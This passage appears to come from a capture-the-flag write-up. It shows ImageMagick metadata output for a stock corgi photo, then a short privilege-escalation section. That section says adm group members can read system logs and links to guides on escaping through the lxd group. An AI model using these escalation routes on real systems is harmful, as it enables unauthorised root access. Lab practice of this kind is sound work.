      Keyword[2,25]: young
      Keyword[2,25]: view
      Keyword[2,25]: background
      Keyword[2,25]: park
      Keyword[2,25]: life
      Keyword[2,25]: little
      Keyword[2,25]: walk
      Keyword[2,25]: tongue
      Keyword[2,25]: enjoy
      Keyword[2,25]: pet
      Keyword[2,25]: ears
      Keyword[2,25]: pretty
      Keyword[2,25]: domestic
      Keyword[2,25]: lovely
      Keyword[2,25]: horizontal
      Keyword[2,25]: sun
      Keyword[2,25]: grass
      Keyword[2,25]: park
      Keyword[2,25]: portrait
      Copyright String[2,116]: Tatyana Panova
      Local Caption[2,121]: Three Pembroke Welsh Corgis side by side outdoors. Approved by Denise Flaim September 2018 and Susan Sprung.
Adobe Stock #118102236
    Profile-xmp: 11595 bytes
  Properties:
    date:create: 2023-07-28T07:56:48+00:00
    date:modify: 2023-07-28T07:56:48+00:00
    date:timestamp: 2023-07-28T08:22:29+00:00
    exif:ApertureValue: 24361/8200
    exif:Artist: Photographer: Tatyana Panova
    exif:BitsPerSample: 8, 8, 8
    exif:BodySerialNumber: 3431608384
    exif:ColorSpace: 1
    exif:ComponentsConfiguration: ...
    exif:Contrast: 2
    exif:Copyright: Tatyana Panova.www.tpanova.ru
    exif:CustomRendered: 0
    exif:DateTime: 2019:02:18 12:24:51
    exif:DateTimeDigitized: 2016:07:23 08:59:38
    exif:DateTimeOriginal: 2016:07:23 08:59:38
    exif:ExifOffset: 540
    exif:ExifVersion: 0221
    exif:ExposureBiasValue: 0/1
    exif:ExposureMode: 1
    exif:ExposureProgram: 1
    exif:ExposureTime: 1/250
    exif:Flash: 16
    exif:FlashPixVersion: 0100
    exif:FNumber: 14/5
    exif:FocalLength: 135/1
    exif:FocalPlaneResolutionUnit: 2
    exif:FocalPlaneXResolution: 327183/85
    exif:FocalPlaneYResolution: 633119/162
    exif:ImageDescription: Three Pembroke Welsh Corgis side by side outdoors. Approved by Denise Flaim September 2018 and Susan Sprung..Adobe Stock #118102236
    exif:ImageLength: 3744
    exif:ImageNumber: 0
    exif:ImageWidth: 5616
    exif:LensModel: EF135mm f/2L USM
    exif:LensSpecification: 135/1, 135/1, 0/0, 0/0
    exif:Make: Canon
    exif:MaxApertureValue: 2/1
    exif:MeteringMode: 5
    exif:Model: Canon EOS 5D Mark II
    exif:PhotographicSensitivity: 125
    exif:PhotometricInterpretation: 2
    exif:PixelXDimension: 600
    exif:PixelYDimension: 400
    exif:SamplesPerPixel: 3
    exif:Saturation: 0
    exif:SceneCaptureType: 0
    exif:Sharpness: 2
    exif:ShutterSpeedValue: 56573/7102
    exif:Software: Adobe Photoshop CC 2018 (Macintosh)
    exif:SubSecTimeOriginal: 82
    exif:thumbnail:Compression: 6
    exif:thumbnail:JPEGInterchangeFormat: 1222
    exif:thumbnail:JPEGInterchangeFormatLength: 5751
    exif:thumbnail:ResolutionUnit: 2
    exif:thumbnail:XResolution: 72/1
    exif:thumbnail:YResolution: 72/1
    exif:WhiteBalance: 1
    exif:YCbCrPositioning: 1
    exif:YCbCrSubSampling: 0
    icc:copyright: Copyright (c) 1998 Hewlett-Packard Company
    icc:description: sRGB IEC61966-2.1
    icc:manufacturer: IEC http://www.iec.ch
    icc:model: IEC 61966-2.1 Default RGB colour space - sRGB
    jpeg:colorspace: 2
    jpeg:sampling-factor: 1x1,1x1,1x1
    signature: e17ca655d39c7f751b54623d0cc860d9b590af79fa73f44bac0589086893b585
  Artifacts:
    verbose: true
  Tainted: False
  Filesize: 265188B
  Number pixels: 240000
  Pixel cache type: Memory
  Pixels per second: 8.97768MP
  User time: 0.010u
  Elapsed time: 0:01.026
  Version: ImageMagick 7.1.1-14 Q16-HDRI x86_64 e284d8387:20230722 https://imagemagick.org
```


## Privilege escalation


### lxd group

![](/assets/obsidian/1f5acf761e886c108faf96d0dbe14da4.png)

> **Adm Group**
>Usually members of the group adm have permissions to read log files located inside /var/log/.
> Therefore, if you have compromised a user inside this group you should definitely take a look to the logs.
{: .prompt-tip }

When it comes to `lxd` group

> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

> https://reboare.github.io/lxd/lxd-escape.html

